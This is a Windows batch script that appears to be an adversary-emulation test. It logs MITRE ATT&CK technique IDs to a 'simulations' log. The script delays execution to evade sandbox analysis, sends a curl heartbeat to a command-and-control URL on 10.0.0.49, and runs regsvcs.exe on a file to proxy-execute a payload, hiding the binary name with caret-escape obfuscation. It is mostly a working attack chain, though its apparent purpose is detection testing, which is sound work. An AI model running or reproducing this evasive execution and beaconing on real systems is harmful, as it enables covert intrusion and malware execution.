@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO escapes)
SET vfrnm=%APPDATA%\8493\3a4ccbf5
SET bdffc=https://10.0.0.49
SET xhjnv=https://10.0.0.49/stage/2/icon.png?8493-7
SET lkzap=ITZEL-S2BO
SET qwzxc=7
SET akjdh=firelox.txt
SET mnyhg=8493

REM Log file path
SET oqpvk=%APPDATA%\!qwzxc!\macula-simulations.log
SET mxcvb=1
SET plkij=

REM Initial delay - evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_start=30s>> "!oqpvk!" 2>nul
timeout /t 30 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_complete>> "!oqpvk!" 2>nul

REM C2 heartbeat (FIRST TASK - no obfuscation on curl)
echo [%DATE% %TIME%][DEBUG][!lkzap!]: heartbeat_start>> "!oqpvk!" 2>nul
curl -k -s -o nul "!xhjnv!"
echo [%DATE% %TIME%][DEBUG][!lkzap!]: heartbeat_complete>> "!oqpvk!" 2>nul

REM Delay before next operation
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_start=12s>> "!oqpvk!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_complete>> "!oqpvk!" 2>nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!lkzap!]: chdir_start=!vfrnm!>> "!oqpvk!" 2>nul
cd /d "!vfrnm!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET mxcvb=0
    SET plkij=dir_not_found
    echo [%DATE% %TIME%][DEBUG][!lkzap!]: chdir_failed=!ERRORLEVEL!>> "!oqpvk!" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][!lkzap!]: chdir_success>> "!oqpvk!" 2>nul
)

REM TTP logging for directory operation
SET rtyui=%DATE:~-4%-%DATE:~-7,2%-%DATE:~-10,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
echo [!rtyui!][!lkzap!]: !qwzxc!-!mnyhg!-T1218|Signed Binary Proxy Execution=!mxcvb!:!plkij!>> "!oqpvk!" 2>nul

REM Random delay between 10-29 seconds
SET /A cvfdr=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!lkzap!]: random_delay_start=!cvfdr!s>> "!oqpvk!" 2>nul
timeout /t !cvfdr! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!lkzap!]: random_delay_complete>> "!oqpvk!" 2>nul

REM Obfuscated regsvcs.exe execution with heavy caret escaping
echo [%DATE% %TIME%][DEBUG][!lkzap!]: dll_execution_start=!akjdh!>> "!oqpvk!" 2>nul
SET nxvbn=r^e^g^s^v
SET lpoiu=c^s^.^e^x
SET qazws=!nxvbn!!lpoiu! !akjdh!

REM Alternative path if first fails
SET wsxcd=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\r^e^g^s^v^c^s^.^e^x^e
IF EXIST "!wsxcd!" (
    CALL !wsxcd! "!akjdh!"
) ELSE (
    %qazws%
)

IF !ERRORLEVEL! NEQ 0 (
    SET mxcvb=0
    SET plkij=execution_failed_!ERRORLEVEL!
    echo [%DATE% %TIME%][DEBUG][!lkzap!]: dll_execution_failed=!ERRORLEVEL!>> "!oqpvk!" 2>nul
) ELSE (
    SET mxcvb=1
    SET plkij=
    echo [%DATE% %TIME%][DEBUG][!lkzap!]: dll_execution_success>> "!oqpvk!" 2>nul
)

REM Final delay before exit
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_start=15s>> "!oqpvk!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [%DATE% %TIME%][DEBUG][!lkzap!]: delay_complete>> "!oqpvk!" 2>nul

REM TTP logging for DLL execution
SET rtyui=%DATE:~-4%-%DATE:~-7,2%-%DATE:~-10,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
echo [!rtyui!][!lkzap!]: !qwzxc!-!mnyhg!-T1218.004|Regsvcs=!mxcvb!:!plkij!>> "!oqpvk!" 2>nul

ENDLOCAL